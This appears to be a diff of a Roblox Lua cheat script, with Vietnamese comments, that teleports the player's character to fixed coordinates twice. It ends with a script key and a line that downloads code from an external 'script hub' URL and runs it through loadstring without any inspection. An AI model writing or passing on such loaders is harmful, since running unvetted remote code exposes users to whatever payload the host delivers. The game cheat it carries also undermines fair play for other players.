@@ -1,2 +1,32 @@
+local player = game.Players.LocalPlayer
+
+-- Chờ nhân vật xuất hiện trước khi dịch chuyển
+local function waitForCharacter()
+    while not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") do
+        player.CharacterAdded:Wait()
+    end
+    return player.Character
+end
+
+-- Hàm dịch chuyển nhân vật đến tọa độ mong muốn
+local function teleportCharacter(xz, yz, zz)
+    local character = waitForCharacter()
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+
+    if humanoidRootPart then
+        humanoidRootPart.CFrame = CFrame.new(Vector3.new(xz, yz, zz))
+    end
+end
+
+-- Gọi hàm dịch chuyển sau 1 giây
+task.wait(1)
+teleportCharacter(-10271, 4, -7310)
+
+-- Dịch chuyển lần 2 sau 15 giây
+task.spawn(function()
+    task.wait(15)
+    teleportCharacter(1678.7, -136.3, -2379.0)
+end)
+
 script_key="JjmhlAdFeuXFWubLiuoxRyorUCfAzHwb";
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
